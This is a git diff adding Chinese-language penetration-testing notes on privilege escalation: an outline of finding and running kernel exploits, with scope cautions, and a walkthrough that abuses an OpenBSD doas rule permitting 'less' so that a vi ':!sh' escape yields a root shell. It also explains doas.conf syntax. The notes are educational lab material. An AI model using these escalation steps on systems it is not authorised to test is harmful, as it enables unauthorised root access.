@@ -1805,5 +1805,85 @@ root
 
 ### 内核提权
 
-可以参考我的文章 [Lampiao Writeup](https://enilmalus.github.io/posts/lampiao-writeup/)
+可以参考我的文章 [Lampiao Writeup](https://enilmalus.github.io/posts/lampiao-writeup/)。
 
+Linux 内核负责管理系统内存和应用程序等组件之间的通信。这个关键功能要求内核具有特定权限；因此，成功的漏洞利用可能会导致获得 root 权限。内核漏洞利用方法很简单：
+
+1. 确定内核版本
+2. 为目标系统的内核版本搜索并找到一个漏洞利用代码
+3. 运用漏洞利用
+
+注意，失败的内核漏洞利用可能会导致系统崩溃。在尝试内核漏洞利用之前，请确保这种潜在的结果在渗透测试范围内是可接受的。内核漏洞利用往往是攻击者采取的最后一步，因为有时它们更容易被发现引起蓝队的警觉。
+
+内核版本确定后可以通过 `github`、`searchsploit`、`Google` 搜索公开漏洞利用代码。
+
+一些技巧和经验：
+
+1. 使用 `cat /proc/version` 或 `uname -a` 获得内核版本后，在搜索利用是不必过于具体地指定内核版本，宽严并用。
+2. 使用漏洞利用代码之前确保了解其工作原理，一些漏洞利用代码可能会在操作系统上进行更改，导致进一步使用中变得不安全，或者对系统进行不可逆地更改，从而在后期产生问题。
+3. 一些漏洞利用可能在运行后需要进一步互动。要阅读漏洞利用代码、附带地说明和社区评论。
+
+### doas less+vi 提权
+
+查看具有 s 位的可执行文件发现有 `/usr/bin/doas`，查看他的配置文件。
+
+```bash
+Enilmalus$ find / -perm -u=s -type f 2>/dev/null /usr/bin/chfn 
+/usr/bin/chpass 
+/usr/bin/chsh 
+/usr/bin/doas 
+/usr/bin/lpr 
+/usr/bin/lprm 
+/usr/bin/passwd 
+/usr/bin/su 
+/usr/libexec/lockspool 
+/usr/libexec/ssh-keysign 
+/usr/sbin/authpf 
+/usr/sbin/authpf-noip 
+/usr/sbin/pppd 
+/usr/sbin/traceroute 
+/usr/sbin/traceroute6 
+/sbin/ping 
+/sbin/ping6 
+/sbin/shutdown
+Enilmalus$ cat /etc/doas.conf 
+permit nopass keepenv user as root cmd /usr/bin/less args /var/log/authlog 
+permit nopass keepenv root as root
+```
+
+根据提示执行。
+
+```bash
+doas /usr/bin/less /var/log/authlog
+```
+
+在 less 中按 v 启动 vi 编辑状态，然后执行：
+
+```sh
+:!sh
+```
+
+获得 root。
+
+```bash
+Enilmalus# whoami 
+root
+```
+
+OpenBSD 是一个基于 Berkeley Software Distribution（BSD）的开源操作系统，强调正确性、简单性和安全性。这个系统中的 doas 是一个命令行工具，设计用来提供超级用户权限。doas 的配置文件默认位 /etc/doas.conf。此配置规定了哪些用户可以使用 doas 命令以及它们可执行的命令范围。
+
+下面为 doas.conf 可能的文件条目：
+
+```bash
+permit keepenv :wheel
+```
+
+这个条目允许 wheel 的所哟成员使用 doas 命令执行任何操作并保留他们的环境变量。
+
+doas.conf 文件的每一行代表一个规则，这些规则按照文件中的顺序进行处理。一旦找到一个匹配的规则则会停止搜索，使用具有最大限制的规则通常会放在文件顶部。例如：
+
+```sh
+permit nopass enil as root cmd reboot
+```
+
+这个规则允许用户 enil 不需要密码作为 root 用户允许 reboot 命令。
